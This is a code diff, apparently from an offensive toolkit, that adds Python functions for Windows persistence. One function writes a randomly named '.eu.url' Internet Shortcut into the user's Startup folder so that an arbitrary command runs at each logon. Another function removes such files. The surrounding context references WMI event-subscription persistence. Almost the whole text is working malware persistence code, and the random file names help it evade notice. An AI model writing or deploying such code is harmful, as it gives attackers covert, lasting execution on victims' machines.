@@ -129,3 +129,35 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
         return True
     else:
         return False
+
+# ---------------- Persistence using startup files ----------------
+
+def startup_file_persistence(cmd):
+    appdata    = os.path.expandvars("%AppData%")
+    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+    if os.path.exists(startup_dir):
+        random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
+        persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
+
+        content = '\n[InternetShortcut]\nURL=file:///%s\n' % cmd
+
+        f = open(persistence_file, 'w')
+        f.write(content)
+        f.close()
+        
+        return True
+    else:
+        return False
+
+def remove_startup_file_persistence():
+    appdata    = os.path.expandvars("%AppData%")
+    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+    found = False
+    if os.path.exists(startup_dir):
+        for f in os.listdir(startup_dir):
+            file = os.path.join(startup_dir, f)
+            if file.endswith('.eu.url'):
+                os.remove(file)
+                found = True
+    
+    return found
